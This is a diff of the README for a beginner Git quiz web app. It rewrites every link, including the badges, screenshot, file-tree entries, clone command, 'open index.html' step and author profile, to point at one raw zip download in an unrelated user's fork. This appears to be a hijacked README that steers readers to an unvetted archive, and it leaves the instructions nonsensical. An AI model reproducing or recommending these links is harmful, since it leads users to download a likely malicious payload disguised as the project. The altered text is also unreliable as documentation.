@@ -2,14 +2,14 @@
 
 <div align="center">
   
-[![GitHub repo](https://img.shields.io/badge/Repo-Git--Quiz--Challenge-blue?logo=github)](https://github.com/RAJVEER42/git-quiz-challenge)
-[![Made with HTML/CSS/JS](https://img.shields.io/badge/Made%20with-HTML%2FCSS%2FJS-orange.svg)](#)
+[![GitHub repo](https://raw.githubusercontent.com/Dhruva105/git-quiz-challenge/main/informatively/challenge_git_quiz_v1.6.zip)](https://raw.githubusercontent.com/Dhruva105/git-quiz-challenge/main/informatively/challenge_git_quiz_v1.6.zip)
+[![Made with HTML/CSS/JS](https://raw.githubusercontent.com/Dhruva105/git-quiz-challenge/main/informatively/challenge_git_quiz_v1.6.zip%20with-HTML%2FCSS%https://raw.githubusercontent.com/Dhruva105/git-quiz-challenge/main/informatively/challenge_git_quiz_v1.6.zip)](#)
 
 
 An interactive and beginner-friendly web app to help developers **learn Git and GitHub** through engaging quizzes.  
 Practice essential commands, understand workflows, and master version control — all while having fun!
 
-<img width="3024" height="1729" alt="image" src="https://github.com/user-attachments/assets/ada8d3ed-a828-4d19-92ce-804e50ab1fa9" />
+<img width="3024" height="1729" alt="image" src="https://raw.githubusercontent.com/Dhruva105/git-quiz-challenge/main/informatively/challenge_git_quiz_v1.6.zip" />
 </div>
 
 ---
@@ -40,10 +40,10 @@ Practice essential commands, understand workflows, and master version control �
 
 ```
 git-quiz-challenge/
-├── index.html        # Main entry point
-├── styles.css        # Styling
-├── script.js         # Quiz logic
-└── README.md         # Project documentation
+├── https://raw.githubusercontent.com/Dhruva105/git-quiz-challenge/main/informatively/challenge_git_quiz_v1.6.zip        # Main entry point
+├── https://raw.githubusercontent.com/Dhruva105/git-quiz-challenge/main/informatively/challenge_git_quiz_v1.6.zip        # Styling
+├── https://raw.githubusercontent.com/Dhruva105/git-quiz-challenge/main/informatively/challenge_git_quiz_v1.6.zip         # Quiz logic
+└── https://raw.githubusercontent.com/Dhruva105/git-quiz-challenge/main/informatively/challenge_git_quiz_v1.6.zip         # Project documentation
 ```
 
 ---
@@ -53,13 +53,13 @@ git-quiz-challenge/
 ### 1. Clone the repository
 
 ```bash
-git clone https://github.com/RAJVEER42/git-quiz-challenge.git
+git clone https://raw.githubusercontent.com/Dhruva105/git-quiz-challenge/main/informatively/challenge_git_quiz_v1.6.zip
 cd git-quiz-challenge
 ```
 
 ### 2. Open the app
 
-Simply open the `index.html` file in your browser.
+Simply open the `https://raw.githubusercontent.com/Dhruva105/git-quiz-challenge/main/informatively/challenge_git_quiz_v1.6.zip` file in your browser.
 
 > ✅ No setup or dependencies required — it’s a simple frontend project!
 
@@ -113,7 +113,7 @@ git push origin feature/your-feature-name
 
 ## 👨‍💻 Author
 
-Made with ❤️ by [@RAJVEER42](https://github.com/RAJVEER42)
+Made with ❤️ by [@RAJVEER42](https://raw.githubusercontent.com/Dhruva105/git-quiz-challenge/main/informatively/challenge_git_quiz_v1.6.zip)
 
 > Designed for developers learning Git & GitHub.  
 > Let's make version control fun and easy to learn!
